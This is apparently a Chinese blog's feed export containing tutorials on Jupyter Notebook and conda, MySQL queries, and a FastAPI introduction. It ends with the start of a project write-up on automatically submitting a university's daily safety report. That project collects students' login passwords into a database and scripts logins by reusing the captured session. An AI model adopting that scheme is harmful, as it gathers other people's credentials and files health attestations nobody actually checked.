<p><code>Anaconda prompt</code>是专门用来操作<code>anaconda</code>的终端。如果你安装完<code>Anaconda</code>后没有在环境变量的<code>PATH</code>中添加相关的环境变量，那么以后你想在终端使用<code>anaconda</code>相关的命令，则必须要在<code>Anaconda prompt</code>中完成。</p>
<h4 id="2、1、2-Anaconda-Navigator：">2、1、2 Anaconda Navigator：</h4>
<p>这个相当于是一个导航面板，上面组织了<code>Anaconda</code>相关的软件。</p>
<h4 id="2、1、3-Spyder：">2、1、3 Spyder：</h4>
<p>一个专门开发<code>Python</code>的软件，熟悉<code>MATLAB</code>的同学会比较有亲切感，但在后期的学习过程中，我们将不会使用这个工具写代码，因为还有更好的可替代的工具。</p>
<h3 id="2、2-Jupyter-介绍">2、2 Jupyter 介绍</h3>
<p>Jupyter项目是一个非盈利的开源项目，源于2014年的ipython项目，因为它逐渐发展为支持跨所有编程语言的交互式数据科学和科学计算</p>
<ul>
<li>Jupyter Notebook，原名IPython Notbook，是IPython的加强网页版，一个开源Web应用程序</li>
<li>名字源自Julia、Python 和 R（数据科学的三种开源语言）</li>
<li>是一款程序员和科学工作者的<strong>编程/文档/笔记/展示</strong>软件</li>
<li><strong>.ipynb</strong>文件格式是用于计算型叙述的<strong>JSON文档格式</strong>的正式规范</li>
</ul>
<h4 id="2、2、1-为什么使用-Jupyter-Notebook">2、2、1 为什么使用 Jupyter Notebook ?</h4>
<ul>
<li>传统软件开发： 工程／目标明确
<ul>
<li>需求分析，设计架构，开发模块，测试</li>
</ul>
</li>
<li>数据挖掘：艺术／目标不明确
<ul>
<li>目的是具体的洞察目标，而不是机械的完成任务</li>
<li>通过执行代码来理解问题</li>
<li>迭代式地改进代码来改进解决方法</li>
</ul>
</li>
</ul>
<p>实时运行的代码、叙事性的文本和可视化被整合在一起，方便使用代码和数据来讲述故事</p>
<p>一个Python编辑环境，可以实时的查看代码的运行效果。</p>
<h4 id="2、2、2-对比-Jupyter-Notebook-和-Pycharm">2、2、2 对比 Jupyter Notebook 和 Pycharm</h4>
<p>Jupyter Notebook 相比 Pycharm 在画图和数据展示方面更有优势。</p>
<h3 id="2、3-Jupyter-Notebook-的使用">2、3 Jupyter Notebook 的使用</h3>
<h4 id="2、3、1-jupyter-安装与适配">2、3、1 jupyter 安装与适配</h4>
<ul>
<li>
<p>首先在终端下安装 jupyter，Anaconda环境下默认自带会安装</p>
<pre class="language-cmd" data-language="cmd"><code class="language-cmd">pip install jupyter</code></pre>
</li>
<li>
<p>安装jupyter拓展库</p>
<pre class="language-cmd" data-language="cmd"><code class="language-cmd">pip install autopep8  # 安装pep8代码规范的模块
pip install jupyter_contrib_nbextensions  # 安装 jupyter 拓展包
pip install yapf  # 安装拓展包依赖的第三方功能模块</code></pre>
</li>
<li>
<p>拓展包安装后需要执行命令适配</p>
<pre class="language-cmd" data-language="cmd"><code class="language-cmd">&quot;&quot;&quot;拓展包适配&quot;&quot;&quot;
jupyter contrib nbextension install --user
jupyter nbextension enable code_prettify&#x2F;code_prettify</code></pre>
</li>
<li>
<p>环境搭建好后，在命令行下输入 <code>jupyter notebook</code> 命令，会自动弹出浏览器窗口打开 Jupyter Notebook</p>
<pre class="language-cmd" data-language="cmd"><code class="language-cmd"># 输入命令
jupyter notebook</code></pre>
<p>本地notebook的默认URL为：<a href="http://localhost:8888">http://localhost:8888</a></p>
<blockquote>
<p>想让notebook打开指定目录，只要进入此目录后执行命令即可</p>
</blockquote>
</li>
<li>
<p>打开<code>jupyter notebook</code>以后，在<code>Nbextensions</code>选项下勾选配置选项，如下图所示：</p>
</li>
<li>
<p>添加拓展配置以后的效果</p>
</li>
<li>
<p><code>Jupyter notebook</code>汉化，更改为中文界面</p>
<ul>
<li>
<p>首先桌面-此电脑-右击 属性，选择<strong>高级系统设置</strong></p>
</li>
<li>
<p>弹出的选项卡中，选择 高级–环境变量</p>
</li>
<li>
<p>选择上面的用户变量，是用户变量，点击新建，新建用户变量</p>
<pre class="language-none"><code class="language-none">变量名：LANG 
变量值：zh_CN.UTF8</code></pre>
</li>
</ul>
<pre class="language-none"><code class="language-none">  </code></pre>
</li>
<li>
<blockquote>
<p>重要：配置好后需要关闭cmd终端，重新启动<code>jupyter</code>才会生效。</p>
</blockquote>
</li>
</ul>
<h4 id="2、3、2-创建文件">2、3、2 创建文件</h4>
<ul>
<li>
<p>新建notebook文档</p>
</li>
<li>
<p>内容界面操作</p>
</li>
</ul>
<p>**标题栏：**点击标题（如Untitled）修改文档名</p>
<h4 id="2、3、3-cell-单元格操作">2、3、3 cell 单元格操作</h4>
<ul>
<li>什么是cell？
<ul>
<li><strong>cell</strong>：一对In Out会话被视作一个代码单元，称为cell</li>
<li>cell行号前的 * ，表示代码正在运行</li>
</ul>
</li>
</ul>
<p>Jupyter支持两种模式：</p>
<ul>
<li>编辑模式（Enter）
<ul>
<li>命令模式下<code>回车Enter</code>或<code>鼠标双击</code>cell进入编辑模式</li>
<li>可以<strong>操作cell内文本</strong>或代码，剪切／复制／粘贴移动等操作</li>
</ul>
</li>
<li>命令模式（Esc）
<ul>
<li>按<code>Esc</code>退出编辑，进入命令模式</li>
<li>可以<strong>操作cell单元本身</strong>进行剪切／复制／粘贴／移动等操作</li>
</ul>
</li>
</ul>
<h5 id="快捷键操作">快捷键操作</h5>
<ul>
<li>
<p>两种模式通用快捷键</p>
<ul>
<li><strong><code>Shift+Enter</code>，执行本单元代码，并跳转到下一单元</strong></li>
<li><strong><code>Ctrl+Enter</code>，执行本单元代码，留在本单元</strong></li>
</ul>
</li>
<li>
<p><strong>命令模式</strong>：按ESC进入</p>
<ul>
<li>Y ：在命令模式下转入代码状态</li>
<li>M ：在命令模式下切换到 Markdown</li>
<li>R ：普通文本，运行不会输出结果</li>
<li>L ：为当前cell加上行号</li>
<li>A：在该单元格的上方插入新单元格</li>
<li>B：在该单元格的下方插入新单元格</li>
<li>X：剪切选中的单元</li>
<li>C：复制选中的单元</li>
<li>V：粘贴到下方单元</li>
<li>DD：删除选中的单元（敲两个D）</li>
</ul>
</li>
<li>
<p>其他(了解)</p>
<ul>
<li><code>双击D</code>：删除当前cell</li>
<li><code>Z</code>，回退</li>
<li>快速跳转到首个cell，<code>Crtl+Home</code></li>
<li>快速跳转到最后一个cell，<code>Crtl+End</code> --&gt;</li>
</ul>
</li>
<li>
<p><strong>编辑模式</strong>：按Enter进入</p>
<ul>
<li>补全代码：变量、方法后跟<code>Tab键</code></li>
<li>为一行或多行代码添加/取消注释：<code>Ctrl+/</code>（Mac:CMD+/）</li>
</ul>
</li>
<li>
<p>其他(了解)：</p>
<ul>
<li>多光标操作：<code>Ctrl键点击鼠标</code>（Mac:CMD+点击鼠标）</li>
<li>回退：<code>Ctrl+Z</code>（Mac:CMD+Z）</li>
<li>重做：<code>Ctrl+Y</code>（Mac:CMD+Y)</li>
</ul>
</li>
</ul>
<h5 id="markdown演示">markdown演示</h5>
<p>掌握标题和缩进即可</p>
<h5 id="其他操作">其他操作</h5>
<blockquote>
<p>函数名 + ? 查看源码</p>
</blockquote>
<blockquote>
<p>Tab 自动补全：如果敲代码没有自动补全，可以用<strong>Tab</strong>查看代码提示</p>
</blockquote>
<h2 id="三、小结及注意事项">三、小结及注意事项</h2>
<ul>
<li>是什么
<ul>
<li>是一个 ipython 的 web 加强版</li>
</ul>
</li>
<li>为什么要使用jupyter
<ul>
<li>用于数据探索过程</li>
</ul>
</li>
<li>怎么用
<ul>
<li>1.通过 jupyter notebook 就可以使用</li>
<li>2.保存文件是.ipynb</li>
<li>3.每个内容,都对应的是一个cell</li>
</ul>
</li>
<li>快捷键
<ul>
<li>
<p>Shift+Enter，执行本单元代码，并跳转到下一单元</p>
</li>
<li>
<p>Ctrl+Enter，执行本单元代码，留在本单元</p>
</li>
</ul>
</li>
</ul>
<p><strong>注意事项</strong></p>
<p><code>jupyter notebook</code>每一个<code>cell</code>运行完后都会把这个<code>cell</code>中的变量保存到内存中，如果在一个<code>cell</code>中修改了之前的变量，再此运行这个<code>cell</code>的时候可能会导致一些问题产生。比如以下代码：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 第一个cell中的代码</span>
a <span class="token operator">=</span> <span class="token number">10</span>
b <span class="token operator">=</span> <span class="token number">20</span>

<span class="token comment"># 第二个cell中的代码</span>
c <span class="token operator">=</span> a<span class="token operator">/</span>b
b <span class="token operator">=</span> <span class="token number">0</span></code></pre>
<p>因为第二个<code>cell</code>修改了<code>b</code>变量，此时在整个环境中<code>b</code>都是等于0的，所以以后再运行这个<code>cell</code>的时候，<code>a/b</code>这个就会出问题了。这时候可以使用<code>Kernel-&gt;Restart&amp;Run All</code>来重新运行整个项目。</p>
<h2 id="附录：Jupyter-常用快捷键">附录：Jupyter 常用快捷键</h2>
<h3 id="命令模式（按Esc键）：">命令模式（按Esc键）：</h3>
<ol>
<li>Enter：转入编辑模式</li>
<li>Shift-Enter：运行本单元，选中下个单元</li>
<li>Ctrl-Enter：运行本单元</li>
<li>Alt-Enter：运行本单元，在其下插入新单元</li>
<li>Y：单元转入代码状态</li>
<li>M：单元转入markdown状态</li>
<li>R：单元转入raw状态</li>
<li>1：设定 1 级标题</li>
<li>2：设定 2 级标题</li>
<li>3：设定 3 级标题</li>
<li>4：设定 4 级标题</li>
<li>5：设定 5 级标题</li>
<li>6：设定 6 级标题</li>
<li>Up：选中上方单元</li>
<li>K：选中上方单元</li>
<li>Down：选中下方单元</li>
<li>J：选中下方单元</li>
<li>Shift-K：扩大选中上方单元</li>
<li>Shift-J：扩大选中下方单元</li>
<li>A：在上方插入新单元</li>
<li>B：在下方插入新单元</li>
<li>X：剪切选中的单元</li>
<li>C：复制选中的单元</li>
<li>Shift-V：粘贴到上方单元</li>
<li>V：粘贴到下方单元</li>
<li>Z：恢复删除的最后一个单元</li>
<li>D,D：删除选中的单元</li>
<li>Shift-M：合并选中的单元</li>
<li>Ctrl-S：文件存盘</li>
<li>S：文件存盘</li>
<li>L：转换行号</li>
<li>O：转换输出</li>
<li>Shift-O：转换输出滚动</li>
<li>Esc：关闭页面</li>
<li>Q：关闭页面</li>
<li>H：显示快捷键帮助</li>
<li>I,I：中断Notebook内核</li>
<li>0,0：重启Notebook内核</li>
<li>Shift：忽略</li>
<li>Shift-Space：向上滚动</li>
<li>Space：向下滚动</li>
</ol>
<h3 id="编辑模式：">编辑模式：</h3>
<ol>
<li>Tab : 代码补全或缩进</li>
<li>Shift-Tab : 提示</li>
<li>Ctrl-] : 缩进</li>
<li>Ctrl-[ : 解除缩进</li>
<li>Ctrl-A : 全选</li>
<li>Ctrl-Z : 复原</li>
<li>Ctrl-Shift-Z : 再做</li>
<li>Ctrl-Y : 再做</li>
<li>Ctrl-Home : 跳到单元开头</li>
<li>Ctrl-Up : 跳到单元开头</li>
<li>Ctrl-End : 跳到单元末尾</li>
<li>Ctrl-Down : 跳到单元末尾</li>
<li>Ctrl-Left : 跳到左边一个字首</li>
<li>Ctrl-Right : 跳到右边一个字首</li>
<li>Ctrl-Backspace : 删除前面一个字</li>
<li>Ctrl-Delete : 删除后面一个字</li>
<li>Esc : 进入命令模式</li>
<li>Ctrl-M : 进入命令模式</li>
<li>Shift-Enter : 运行本单元，选中下一单元</li>
<li>Ctrl-Enter : 运行本单元</li>
<li>Alt-Enter : 运行本单元，在下面插入一单元</li>
<li>Ctrl-Shift-- : 分割单元</li>
<li>Ctrl-Shift-Subtract : 分割单元</li>
<li>Ctrl-S : 文件存盘</li>
<li>Shift : 忽略</li>
<li>Up : 光标上移或转入上一单元</li>
<li>Down :光标下移或转入下一单元</li>
</ol>
<h2 id="附录：conda基本使用">附录：conda基本使用</h2>
<p><code>conda</code>伴随着<code>Anaconda</code>安装而自动安装的。<code>conda</code>可以跟<code>virtualenv</code>一样管理不同的环境，也可以跟<code>pip</code>一样管理某个环境下的包。以下来看看两个功能的用法。</p>
<h3 id="环境管理：">环境管理：</h3>
<p><code>conda</code>能跟<code>virtualenv</code>一样管理不同的<code>Python</code>环境，不同的环境之间是互相隔离，互不影响的。为什么需要创建不同的环境呢？原因是有时候项目比较多，但是项目依赖的包不一样，比如<code>A</code>项目用的是<code>Python2</code>开发的，而<code>B</code>项目用的是<code>Python3</code>开发的，那么我们在同一台电脑上就需要两套不同的环境来支撑他们运行了。创建环境的基本命令如下：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># conda create --name [环境名称] 比如以下：</span>
conda create --name da-env</code></pre>
<p>这样将创建一个叫做<code>da-env</code>的环境，这个环境的<code>python</code>解释器根据<code>anaconda</code>来，如果<code>anaconda</code>为<code>3.7</code>，那么将默认使用<code>3.7</code>的环境，如果<code>anaconda</code>内置的是<code>2.7</code>，那么将默认使用<code>2.7</code>的环境。然后你就可以使用<code>conda install numpy</code>的方式来安装包了，并且这样安装进来的包，只会安装在当前环境中。有的同学可能有想问，如果想要装一个<code>Python2.7</code>的环境，<code>anaconda</code>中没有内置<code>Python2.7</code>，那么该怎么实现呢？。实际上，我们只需要在安装的时候指定<code>python</code>的版本，如果这个版本现在不存在，那么<code>anaconda</code>会自动的给我们下载。所以安装<code>Python2.7</code>的环境，使用以下代码即可实现：</p>
<pre class="language-none"><code class="language-none">conda create --name xxx python&#x3D;2.7</code></pre>
<p>以下再列出<code>conda</code>管理环境的其他命令：</p>
<ol>
<li>
<p>创建的时候指定需要安装的包：</p>
<pre class="language-none"><code class="language-none">conda create --name xxx numpy pandas</code></pre>
</li>
<li>
<p>创建的时候既需要指定包，也需要指定python环境：</p>
<pre class="language-none"><code class="language-none">conda create --name xxx python&#x3D;3.6 numpy pandas</code></pre>
</li>
<li>
<p>进入到某个环境</p>
<pre class="language-none"><code class="language-none">windows: activate xxx
mac&#x2F;linux: source activate xxx</code></pre>
</li>
<li>
<p>退出环境：</p>
<pre class="language-none"><code class="language-none">deactivate</code></pre>
</li>
<li>
<p>列出当前所有的环境：</p>
<pre class="language-none"><code class="language-none">conda env list</code></pre>
</li>
<li>
<p>移除某个环境：</p>
<pre class="language-none"><code class="language-none">conda remove --name xxx --all</code></pre>
</li>
<li>
<p>环境下的包导出和导入：</p>
<ul>
<li>导出：<code>conda env export &gt; environment.yml</code>。</li>
<li>导入：<code>conda env create --name xxx -f environment.yml</code>。</li>
</ul>
</li>
</ol>
<h4 id="包管理：">包管理：</h4>
<p><code>conda</code>也可以用来管理包。比如我们创建完一个新的环境后，想要在这个环境中安装包（比如numpy），那么可以通过以下代码来实现：</p>
<pre class="language-python" data-language="python"><code class="language-python">activate xxx
conda install numpy
</code></pre>
<p>以下再介绍一些包管理常用的命令：</p>
<ol>
<li>
<p>在不进入某个环境下直接给这个环境安装包：</p>
<pre class="language-none"><code class="language-none">conda install [包名] -n [环境名]</code></pre>
</li>
<li>
<p>列出该环境下所有的包：</p>
<pre class="language-none"><code class="language-none">conda list</code></pre>
</li>
<li>
<p>卸载某个包：</p>
<pre class="language-none"><code class="language-none">conda remove [包名]</code></pre>
</li>
<li>
<p>设置安装包的源：</p>
<pre class="language-none"><code class="language-none">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;
conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;
conda config --set show_channel_urls yes</code></pre></li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Jupyter</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL语句</title>
    <url>/web/mysql/</url>
    <content><![CDATA[<h3 id="MySQL的数据类型">MySQL的数据类型</h3>
<ul>
<li>MySQL支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型。</li>
<li>备注: char 和varchar 一定要指定长度，float 会自动提升为double，timestamp 是时间的混合类型，理 论上可以存储 时间格式和时间戳。</li>
</ul>
<table>
<thead>
<tr>
<th>类型</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>int</td>
<td>整型，相当于java的int</td>
</tr>
<tr>
<td>bigint</td>
<td>整型，相当于java的long</td>
</tr>
<tr>
<td>float</td>
<td>浮点型</td>
</tr>
<tr>
<td>double</td>
<td>浮点型</td>
</tr>
<tr>
<td>datatime</td>
<td>日期类型</td>
</tr>
<tr>
<td>timestamp</td>
<td>日期类型（可储存时间戳</td>
</tr>
<tr>
<td>char</td>
<td>定长字符</td>
</tr>
<tr>
<td>varchar</td>
<td>不定长字符</td>
</tr>
<tr>
<td>text</td>
<td>大文本，用于储存比较长的字符内容</td>
</tr>
<tr>
<td>blob</td>
<td>字节数据类型，储存图片、音频等文件</td>
</tr>
</tbody>
</table>
<h3 id="建表操作">建表操作</h3>
<p>– 删除表<br>
DROP TABLE IF EXISTS 表名;<br>
– 新建表<br>
create table 表名(字段名 类型 约束（主键，非空，唯一，默认值），字段名 类型 约束（主键，非空，唯一，默认值)编码，存储引擎；</p>
<blockquote>
<p>在 SQL 中，我们有如下约束：</p>
<ul>
<li>NOT NULL - 指示某列不能存储 NULL 值。</li>
<li>UNIQUE - 保证某列的每行必须有唯一的值。</li>
<li>PRIMARY KEY - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助 于更容易更快速地找到表中的一个特定的记录。</li>
<li>FOREIGN KEY - 保证一个表中的数据匹配另一个表中的值的参照完整性。</li>
<li>CHECK - 保证列中的值符合指定的条件。</li>
<li>DEFAULT - 规定没有给列赋值时的默认值。</li>
</ul>
</blockquote>
<ul>
<li>实例</li>
</ul>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">DROP TABLE IF EXISTS &#96;websites&#96;;
CREATE TABLE &#96;websites&#96; (
id int(11) NOT NULL AUTO_INCREMENT,
name char(20) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;站点名称&#39;,
url varchar(255) NOT NULL DEFAULT &#39;&#39;,
alexa int(11) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;Alexa 排名&#39;,
sal double COMMENT &#39;广告收入&#39;,
country char(10) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;国家&#39;,
PRIMARY KEY (id)
) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</code></pre>
<h3 id="插入、删除、更新">插入、删除、更新</h3>
<ul>
<li>插入语句</li>
</ul>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">INSERT INTO websites(name, url,alexa,sal,country ) VALUES (&#39;腾讯&#39;, &#39;https:&#x2F;&#x2F;www.qq.com&#39;,
18, 1000,&#39;CN&#39; ) ;</code></pre>
<ul>
<li>删除语句</li>
</ul>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">delete from websites where id &#x3D; 5;</code></pre>
<ul>
<li>更新语句</li>
</ul>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">update websites set sal &#x3D; null where id &#x3D; 3</code></pre>
<h3 id="基本select查询语句">基本select查询语句</h3>
<ul>
<li>初始化数据</li>
</ul>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">DROP TABLE IF EXISTS &#96;websites&#96;;
CREATE TABLE &#96;websites&#96; (
id int(11) NOT NULL AUTO_INCREMENT,
name char(20) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;站点名称&#39;,
url varchar(255) NOT NULL DEFAULT &#39;&#39;,
alexa int(11) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;Alexa 排名&#39;,
sal double COMMENT &#39;广告收入&#39;,
country char(10) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;国家&#39;,
PRIMARY KEY (id)
) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;
INSERT INTO &#96;websites&#96; VALUES
(1, &#39;Google&#39;, &#39;https:&#x2F;&#x2F;www.google.cm&#x2F;&#39;, &#39;1&#39;, 2000,&#39;USA&#39;),
(2, &#39;淘宝&#39;, &#39;https:&#x2F;&#x2F;www.taobao.com&#x2F;&#39;, &#39;13&#39;,2050, &#39;CN&#39;),
(3, &#39;菜鸟教程&#39;, &#39;http:&#x2F;&#x2F;www.runoob.com&#x2F;&#39;, &#39;4689&#39;,0.0001, &#39;CN&#39;),
(4, &#39;微博&#39;, &#39;http:&#x2F;&#x2F;weibo.com&#x2F;&#39;, &#39;20&#39;,50, &#39;CN&#39;),
(5, &#39;Facebook&#39;, &#39;https:&#x2F;&#x2F;www.facebook.com&#x2F;&#39;, &#39;3&#39;, 500,&#39;USA&#39;);
CREATE TABLE IF NOT EXISTS &#96;access_log&#96; (
&#96;aid&#96; int(11) NOT NULL AUTO_INCREMENT,
&#96;site_id&#96; int(11) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;网站id&#39;,
&#96;count&#96; int(11) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;访问次数&#39;,
&#96;date&#96; date NOT NULL,
PRIMARY KEY (&#96;aid&#96;)
) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;
INSERT INTO &#96;access_log&#96; (&#96;aid&#96;, &#96;site_id&#96;, &#96;count&#96;, &#96;date&#96;) VALUES
(1, 1, 45, &#39;2016-05-10&#39;),
(2, 3, 100, &#39;2016-05-13&#39;),
(3, 1, 230, &#39;2016-05-14&#39;),
(4, 2, 10, &#39;2016-05-14&#39;),
(5, 5, 205, &#39;2016-05-14&#39;),
(6, 4, 13, &#39;2016-05-15&#39;),
(7, 3, 220, &#39;2016-05-15&#39;),
(8, 5, 545, &#39;2016-05-16&#39;),
(9, 3, 201, &#39;2016-05-17&#39;),
(10, 88, 9999, &#39;2016-09-09&#39;);</code></pre>
<ul>
<li>查询语句</li>
</ul>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from websites
select id, name, url, alexa, sal, country from websites</code></pre>
<h3 id="分页查询">分页查询</h3>
<blockquote>
<p>MySQL分页很优雅</p>
</blockquote>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from websites limit 2,3 ; -- 从第2条(下标从0开始)开始查，查3条数据
select * from websites limit 3 ; -- 从第0条(下标从0开始)开始查，查3条数据</code></pre>
<h3 id="distinct关键字">distinct关键字</h3>
<blockquote>
<p>Distinct关键字用于返回唯一不同的值</p>
</blockquote>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select distinct country from websites</code></pre>
<h3 id="where语句">where语句</h3>
<blockquote>
<p>作为条件筛选, 运算符: &gt; &lt; &gt;= &lt;= &lt;&gt; != =</p>
<p>is null is not null (因为在sql 语句中null 和任何东西比较都是假，包括它本身)</p>
<p>like in</p>
</blockquote>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from websites where sal &gt; 500</code></pre>
<h3 id="逻辑条件：and、or">逻辑条件：and、or</h3>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from websites where sal &gt;&#x3D; 0 and sal &lt;&#x3D;2000 ; -- 收入在 0 到 2000 之间
select * from websites where sal between 0 and 2000； -- 和上面一样的，没事找事
select * from websites where sal &lt; 5 or sal is null ; -- 收入小于5 或者没收入</code></pre>
<blockquote>
<p>注意： null 的条件判断用 is null 或 is not null</p>
</blockquote>
<h3 id="order-by">order by</h3>
<p>排序: 默认情况下是升序，asc 可以省略 。</p>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from websites order by sal asc,alexa desc ;-- 先根据sal 升序排序，再根据 alexa 降序</code></pre>
<h3 id="like-和-通配符">like 和 通配符</h3>
<blockquote>
<ul>
<li>like 模糊查询</li>
<li>通配符
<ul>
<li>% ： 0个或多个字符</li>
<li>_ : 1 个字符</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="in">in</h3>
<ul>
<li>匹配多个条件</li>
</ul>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from websites where country in (&#39;USA&#39;,&#39;鸟国&#39;,&#39;CN&#39;);</code></pre>
<ul>
<li>等价于</li>
</ul>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select * from websites where country &#x3D; &#39;USA&#39; or country &#x3D; &#39;鸟国&#39; or country &#x3D; &#39;CN&#39;</code></pre>
<h3 id="别名">别名</h3>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select tt.name &#39;网站名字&#39; from websites tt</code></pre>
<h4 id="Group-by-分组查询">Group by 分组查询</h4>
<blockquote>
<p>注意：分组时候的筛选用 having</p>
<p>常见的几个组函数： max() min() avg() count() sum()</p>
</blockquote>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select avg(sal) aa from websites where sal is not null group by country having aa &gt; 1500</code></pre>
<h3 id="连接查询">连接查询</h3>
<pre class="language-sqlite" data-language="sqlite"><code class="language-sqlite">select name,count,date from websites w , access_log a ; -- 著名的笛卡尔积，没什么意义的
select name,count,date from websites w , access_log a where w.id &#x3D; a.site_id；-- 这是 1992的语法
select name,count,date from websites w inner join access_log a on w.id &#x3D; a.site_id；-- 这是1999 年的语法，推荐使用
select name,count,date from websites w left outer join access_log a on w.id &#x3D; a.site_id；-- 把没有访问的网站也显示出来
-- 注意: inner 和 outer 是可以默认省略的。</code></pre>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>拥抱FastAPI</title>
    <url>/web/fastapi/</url>
    <content><![CDATA[<p>FastAPI 是一个用于构建 API 的现代、快速（高性能）的 web 框架，使用 Python 3.6+ 并基于标准的 Python 类型提示。</p>
<p>关键特性:</p>
<ul>
<li><strong>快速</strong>：可与 <strong>NodeJS</strong> 和 <strong>Go</strong> 比肩的极高性能（归功于 Starlette 和 Pydantic）。<a href="https://fastapi.tiangolo.com/zh/#_11">最快的 Python web 框架之一</a>。</li>
<li><strong>高效编码</strong>：提高功能开发速度约 200％ 至 300％。*</li>
<li><strong>更少 bug</strong>：减少约 40％ 的人为（开发者）导致错误。*</li>
<li><strong>智能</strong>：极佳的编辑器支持。处处皆可自动补全，减少调试时间。</li>
<li><strong>简单</strong>：设计的易于使用和学习，阅读文档的时间更短。</li>
<li><strong>简短</strong>：使代码重复最小化。通过不同的参数声明实现丰富功能。bug 更少。</li>
<li><strong>健壮</strong>：生产可用级别的代码。还有自动生成的交互式文档。</li>
<li><strong>标准化</strong>：基于（并完全兼容）API 的相关开放标准：<a href="https://github.com/OAI/OpenAPI-Specification">OpenAPI</a> (以前被称为 Swagger) 和 <a href="https://json-schema.org/">JSON Schema</a>。</li>
</ul>
<p>* 根据对某个构建线上应用的内部开发团队所进行的测试估算得出。</p>
<p>上一次的全栈项目自动安全上报后端启用的是flask，这次让我们来拥抱FastAPI！</p>
<p>官网文档：<a href="https://fastapi.tiangolo.com/zh/">FastAPI (tiangolo.com)</a></p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>FastAPI</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CTGU自动打卡</title>
    <url>/web/Yiqing/</url>
    <content><![CDATA[<h1 style="text-align:center;font-weight:700;color:#B399FF"><i>CTGU自动安全上报</i></h1>
<p>项目名称：CTGU自动安全上报</p>
<p>所使用技术栈：Vue2 + Flask + MySQL</p>
<p>实现过程：用户通过提交表单数据到Flask提供的API接口，将学号密码存储到MySQL数据库中，再通过服务器端Python脚本每天调用数据库参数对CTGU安全上报接口进行请求，达到自动安全上报。</p>
<p>源码地址：<a href="https://github.com/Alexation/Yiqing">Alexation/Yiqing: CTGU Auto Safety Report (github.com)</a></p>
<p>实现过程大致分为三个阶段：</p>
<ol>
<li>自动安全上报脚本编写</li>
<li>前端用户信息收集</li>
<li>后端提供API接口</li>
</ol>
<h2 id="自动安全上报脚本编写">自动安全上报脚本编写</h2>
<h3 id="Python脚本构造思路">Python脚本构造思路</h3>
<h4 id="1-明确需求（Website）">1.明确需求（Website）</h4>
<h4 id="2-发送请求（Request）">2.发送请求（Request）</h4>
<ul>
<li>请求方式：Get、Post</li>
<li>请求URL：URL全称统一资源定位符，如一个网页文档、一张图片、一个视频等都可以用URL唯一来确定</li>
<li>请求头：头部信息如User-Agent、Host、Cookies等信息</li>
<li>请求体：请求时额外携带的数据，如表单提交时的表单数据</li>
</ul>
<h4 id="3-获取数据（Response）">3.获取数据（Response）</h4>
<ul>
<li>响应状态：有多种响应状态，如200代表成果、301跳转、404找不到页面、502服务器错误等</li>
<li>响应头：如内容类型、内容长度、服务器信息、设置Cookie等</li>
<li>响应体：最主要的部分、包含了请求资源的内容，如网页的HTML、图片的二进制数据等</li>
</ul>
<h4 id="4-解析数据（Parse）">4.解析数据（Parse）</h4>
<ul>
<li>直接处理</li>
<li>Json解析</li>
<li>正则表达式</li>
<li>BeautifulSoup</li>
<li>Parsel</li>
<li>Xpath/CSS</li>
</ul>
<h4 id="5-存储数据（Database）">5.存储数据（Database）</h4>
<ul>
<li>文本：如纯文本、Json、Xml等</li>
<li>关系型数据库：如MySQL、Orcacle、SQL Server等</li>
<li>非关系型数据库：如MongoDB、Redis等key-value形式储存</li>
<li>二进制文件：如图片、视频、音频等直接保存成特定文件格式</li>
</ul>
<h3 id="根据网页结构编写代码">根据网页结构编写代码</h3>
<p>来到登录页面按下F12并刷新网页，因为登录涉及跳转甚至重定向，因此要勾选Preserve log选项。</p>
<h3 id=""><img src="https://s2.loli.net/2022/02/15/syrAFtjGVi95b4f.png" alt=""></h3>
<p>实际抓包过程中，我们发现登录的Post请求并没有返回相应的关键字段，但是我们发现cookie字段中含有JSESSION便可推断当我们访问登录页面时，服务器返回JSESSION，之后通过我们登陆时的JSESSION对相应的账户进行匹配，于是我们可以直接构造Session对象维持会话。</p>
